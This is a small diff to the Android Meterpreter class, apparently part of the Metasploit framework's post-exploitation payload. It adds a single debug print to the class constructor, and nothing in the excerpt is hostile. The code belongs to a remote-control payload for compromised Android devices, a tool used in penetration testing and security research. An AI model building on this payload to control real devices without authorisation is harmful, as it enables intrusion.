@@ -92,6 +92,7 @@ public class AndroidMeterpreter extends Meterpreter {
 
     public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, String[] parameters, boolean redirectErrors) throws Exception {
         super(in, rawOut, true, redirectErrors, false);
+        System.out.println("msf : Android Meterpreter constructing");
         writeableDir = parameters[0];
         try {
             findContext();
